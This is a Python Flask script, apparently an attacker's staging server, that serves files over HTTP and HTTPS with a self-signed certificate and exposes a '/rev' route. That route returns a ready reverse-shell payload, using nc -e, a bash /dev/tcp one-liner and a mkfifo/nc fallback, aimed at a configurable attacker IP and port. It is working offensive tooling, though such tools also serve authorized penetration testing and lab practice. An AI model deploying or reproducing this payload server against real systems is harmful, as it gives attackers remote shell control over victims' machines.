import argparse
from flask import Flask
import threading
import ssl
from flask import send_from_directory, render_template_string
import os
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime
import tempfile

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip', default=os.environ.get('ATTACKER_IP', '127.0.0.1'), help='Attacker IP')
parser.add_argument('-p', '--port', type=int, default=int(os.environ.get('ATTACKER_PORT', 9001)), help='Attacker Port')
args = parser.parse_args()

app = Flask(__name__)
TRANSFER_FOLDER = os.path.join(os.path.dirname(__file__), 'transfer')

app.config['ATTACKER_IP'] = args.ip
app.config['ATTACKER_PORT'] = args.port

@app.route('/')
def list_files():
    files = []
    if os.path.isdir(TRANSFER_FOLDER):
        files = os.listdir(TRANSFER_FOLDER)
    file_links = [
        f'<li><a href="/{fname}">{fname}</a></li>' for fname in files
    ]
    return render_template_string(
        "<h2>Files in transfer/</h2><ul>{{ files|safe }}</ul>",
        files=''.join(file_links)
    )

@app.route('/<path:filename>')
def download_file(filename):
    # Try transfer folder first
    transfer_path = os.path.join(TRANSFER_FOLDER, filename)
    parent_folder = os.path.abspath(os.path.join(TRANSFER_FOLDER, '..'))
    if os.path.isfile(transfer_path):
        return send_from_directory(TRANSFER_FOLDER, filename, as_attachment=True)
    # Try parent folder if not found in transfer
    parent_path = os.path.join(parent_folder, filename)
    if os.path.isfile(parent_path):
        return send_from_directory(parent_folder, filename, as_attachment=True)
    # Not found
    return "File not found", 404

@app.route('/rev')
def reverse_shell():
    # bash_cmd = f"bash -i >& /dev/tcp/{app.config['ATTACKER_IP']}/{app.config['ATTACKER_PORT']} 0>&1"
    bash_cmd = """#!/bin/bash
nc -e /bin/bash 10.14.14.252 8081 || bash -i >& /dev/tcp/10.14.14.252/8081 0>&1 || rm /tmp/f;mkfifo /tmp/
f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.14.252 8081 >/tmp/f"""
    bash_cmd = bash_cmd.replace('10.14.14.252', app.config['ATTACKER_IP'])
    bash_cmd = bash_cmd.replace('8081', str(app.config['ATTACKER_PORT']))
    return bash_cmd, 200, {'Content-Type': 'text/plain'}

def run_http():
    app.run(host='0.0.0.0', port=80)

def run_https():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Replace with your actual certificate and key file paths
    # Generate a self-signed certificate in memory using cryptography

    # Generate private key
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Armory"),
        x509.NameAttribute(NameOID.COMMON_NAME, u"localhost"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.UTC))
        .not_valid_after(datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )

    # Write cert and key to temporary files
    cert_temp = tempfile.NamedTemporaryFile(delete=False)
    key_temp = tempfile.NamedTemporaryFile(delete=False)
    cert_temp.write(cert.public_bytes(serialization.Encoding.PEM))
    cert_temp.close()
    key_temp.write(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ))
    key_temp.close()

    context.load_cert_chain(certfile=cert_temp.name, keyfile=key_temp.name)
    app.run(host='0.0.0.0', port=443, ssl_context=context)

if __name__ == '__main__':
    threads = []
    try:
        t1 = threading.Thread(target=run_http, daemon=True)
        t2 = threading.Thread(target=run_https, daemon=True)
        threads.extend([t1, t2])
        t1.start()
        t2.start()
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.5)
    except KeyboardInterrupt:
        print("\nShutting down servers...")